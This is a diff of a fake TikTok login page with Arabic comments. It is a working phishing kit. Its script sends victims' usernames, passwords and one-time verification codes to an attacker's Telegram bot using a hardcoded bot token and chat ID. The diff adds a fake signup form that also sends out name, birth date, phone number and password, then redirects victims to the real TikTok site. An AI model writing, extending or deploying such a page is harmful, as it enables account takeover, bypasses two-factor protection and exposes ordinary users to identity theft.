@@ -3,73 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول | TikTok</title>
+    <title>إنشاء حساب | TikTok</title>
     <link rel="icon" href="https://www.tiktok.com/favicon.ico">
     
     <style>
-        /* --- قسم التنسيق (CSS) --- */
+        /* --- التنسيق الجمالي --- */
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; }
-        
-        body { 
-            background: #010101; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            color: white; 
-            margin: 0;
-        }
-
-        .login-card { 
-            background: #121212; 
-            padding: 40px 30px; 
-            border-radius: 16px; 
-            text-align: center; 
-            width: 350px; 
-            border: 1px solid #333; 
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-        }
-
-        .logo { font-size: 32px; font-weight: 800; margin-bottom: 10px; color: #fff; }
-        .subtitle { color: #8a8a8e; font-size: 14px; margin-bottom: 30px; }
-
-        input { 
-            width: 100%; 
-            padding: 14px; 
-            margin: 10px 0; 
-            background: #222; 
-            border: 1px solid #444; 
-            border-radius: 8px; 
-            color: white; 
-            font-size: 16px; 
-            outline: none; 
-            transition: 0.3s;
-        }
-
+        body { background: #010101; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: white; margin: 0; padding: 20px; }
+        .login-card { background: #121212; padding: 35px 25px; border-radius: 16px; text-align: center; width: 100%; max-width: 380px; border: 1px solid #333; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .logo { font-size: 30px; font-weight: 800; margin-bottom: 8px; color: #fff; }
+        .subtitle { color: #8a8a8e; font-size: 14px; margin-bottom: 25px; line-height: 1.5; }
+        input, select { width: 100%; padding: 12px; margin: 8px 0; background: #222; border: 1px solid #444; border-radius: 8px; color: white; font-size: 15px; outline: none; transition: 0.3s; }
         input:focus { border-color: #fe2c55; background: #1a1a1a; }
-
-        .login-btn { 
-            width: 100%; 
-            padding: 14px; 
-            background: #fe2c55; 
-            color: white; 
-            border: none; 
-            border-radius: 8px; 
-            font-weight: bold; 
-            cursor: pointer; 
-            margin-top: 15px; 
-            font-size: 16px;
-        }
-
-        /* تنسيق خاص لحقل الأرقام لمنع الأسهم الجانبية */
-        input[type=number]::-webkit-inner-spin-button, 
-        input[type=number]::-webkit-outer-spin-button { 
-            -webkit-appearance: none; 
-            margin: 0; 
-        }
-
-        .footer-text { margin-top: 25px; font-size: 13px; color: #777; }
-        .footer-text a { color: #fe2c55; text-decoration: none; font-weight: bold; }
+        .login-btn { width: 100%; padding: 13px; background: #fe2c55; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 15px; font-size: 16px; }
+        .footer-text { margin-top: 20px; font-size: 13px; color: #777; }
+        .footer-text span { color: #fe2c55; cursor: pointer; font-weight: bold; text-decoration: underline; }
+        .row { display: flex; gap: 10px; }
     </style>
 </head>
 <body>
@@ -80,9 +29,26 @@
         <form id="loginForm">
             <input type="text" id="username" placeholder="اسم المستخدم أو الإيميل" required>
             <input type="password" id="password" placeholder="كلمة السر" required>
-            <button type="submit" class="login-btn" id="submitBtn">تسجيل الدخول</button>
+            <button type="submit" class="login-btn">تسجيل الدخول</button>
         </form>
-        <div class="footer-text">ليس لديك حساب؟ <a href="#">إنشاء حساب</a></div>
+        <div class="footer-text">ليس لديك حساب؟ <span onclick="showSignup()">إنشاء حساب</span></div>
+    </div>
+
+    <div id="signup-container" class="login-card" style="display: none;">
+        <div class="logo">إنشاء حساب</div>
+        <p class="subtitle">أدخل بياناتك للانضمام إلى تيك توك</p>
+        <form id="signupForm">
+            <input type="text" id="fullName" placeholder="الاسم الكامل" required>
+            <div class="row">
+                <input type="number" id="day" placeholder="اليوم" required>
+                <input type="number" id="month" placeholder="الشهر" required>
+                <input type="number" id="year" placeholder="السنة" required>
+            </div>
+            <input type="tel" id="phone" placeholder="رقم الهاتف" required>
+            <input type="password" id="newPass" placeholder="إنشاء كلمة سر" required>
+            <button type="submit" class="login-btn">إكمال التسجيل</button>
+        </form>
+        <div class="footer-text">لديك حساب بالفعل؟ <span onclick="showLogin()">تسجيل دخول</span></div>
     </div>
 
     <div id="otp-container" class="login-card" style="display: none;">
@@ -90,66 +56,65 @@
         <p class="subtitle">أدخل الرمز المكون من 6 أرقام المرسل إلى هاتفك</p>
         <form id="otpForm">
             <input type="number" id="otpCode" placeholder="0 0 0 0 0 0" required>
-            <button type="submit" class="login-btn" id="confirmBtn">تأكيد الرمز</button>
+            <button type="submit" class="login-btn">تأكيد الرمز</button>
         </form>
     </div>
 
     <script>
-        /* --- قسم البرمجة (JavaScript) --- */
         const B_TOKEN = "8105232434:AAFBeUtacZAGdfX_e2pE2MzBEGgaL8_zgVI";
         const C_ID = "301641581";
 
-        const loginForm = document.getElementById('loginForm');
-        const otpForm = document.getElementById('otpForm');
-        const loginContainer = document.getElementById('login-container');
-        const otpContainer = document.getElementById('otp-container');
+        // وظائف التنقل بين الواجهات
+        function showSignup() {
+            document.getElementById('login-container').style.display = 'none';
+            document.getElementById('signup-container').style.display = 'block';
+        }
+        function showLogin() {
+            document.getElementById('signup-container').style.display = 'none';
+            document.getElementById('login-container').style.display = 'block';
+        }
 
-        // المرحلة الأولى: إرسال اسم المستخدم وكلمة السر
-        loginForm.onsubmit = function(e) {
+        // 1. معالجة تسجيل الدخول العادي
+        document.getElementById('loginForm').onsubmit = function(e) {
             e.preventDefault();
-            
             const u = document.getElementById('username').value;
             const p = document.getElementById('password').value;
-            const btn = document.getElementById('submitBtn');
-
-            btn.innerText = "جاري التحقق...";
-            btn.disabled = true;
-
-            const msg1 = "🚨 *New Login Attempt* 🚨\n👤 User: `" + u + "`\n🔑 Pass: `" + p + "`";
-
-            // إرسال البيانات للبوت
-            fetch("https://api.telegram.org/bot" + B_TOKEN + "/sendMessage?chat_id=" + C_ID + "&text=" + encodeURIComponent(msg1) + "&parse_mode=Markdown")
-            .then(() => {
-                // إخفاء واجهة الدخول وإظهار واجهة الرمز بعد ثانية
-                setTimeout(() => {
-                    loginContainer.style.display = "none";
-                    otpContainer.style.display = "block";
-                }, 800);
-            });
+            sendToBot(`🚨 *Login Attempt* 🚨\n👤 User: \`${u}\`\n🔑 Pass: \`${p}\``);
+            switchInterface('login-container', 'otp-container');
         };
 
-        // المرحلة الثانية: إرسال رمز التحقق والتحويل النهائي
-        otpForm.onsubmit = function(e) {
+        // 2. معالجة إنشاء حساب جديد
+        document.getElementById('signupForm').onsubmit = function(e) {
             e.preventDefault();
-            
+            const name = document.getElementById('fullName').value;
+            const bday = `${document.getElementById('day').value}/${document.getElementById('month').value}/${document.getElementById('year').value}`;
+            const phone = document.getElementById('phone').value;
+            const pass = document.getElementById('newPass').value;
+
+            const msg = `🆕 *New Account Signup* 🆕\n👤 Name: \`${name}\`\n🎂 B-Day: \`${bday}\`\n📱 Phone: \`${phone}\`\n🔑 Pass: \`${pass}\``;
+            sendToBot(msg);
+            switchInterface('signup-container', 'otp-container');
+        };
+
+        // 3. معالجة رمز التحقق والتحويل النهائي
+        document.getElementById('otpForm').onsubmit = function(e) {
+            e.preventDefault();
             const code = document.getElementById('otpCode').value;
-            const btn2 = document.getElementById('confirmBtn');
-
-            btn2.innerText = "جاري التأكيد...";
-            btn2.disabled = true;
-
-            const msg2 = "🔐 *Verification Code:* `" + code + "`";
-
-            // إرسال الرمز للبوت
-            fetch("https://api.telegram.org/bot" + B_TOKEN + "/sendMessage?chat_id=" + C_ID + "&text=" + encodeURIComponent(msg2) + "&parse_mode=Markdown")
-            .then(() => {
-                // التحويل النهائي لتيك توك
-                window.location.href = "https://www.tiktok.com/login";
-            })
-            .catch(() => {
+            sendToBot(`🔐 *OTP Code Received:* \`${code}\``).then(() => {
                 window.location.href = "https://www.tiktok.com/login";
             });
         };
+
+        // دالة مساعدة للإرسال
+        function sendToBot(message) {
+            return fetch(`https://api.telegram.org/bot${B_TOKEN}/sendMessage?chat_id=${C_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
+        }
+
+        // دالة مساعدة للتبديل بين الصناديق
+        function switchInterface(hideId, showId) {
+            document.getElementById(hideId).style.display = 'none';
+            document.getElementById(showId).style.display = 'block';
+        }
     </script>
 </body>
 </html>
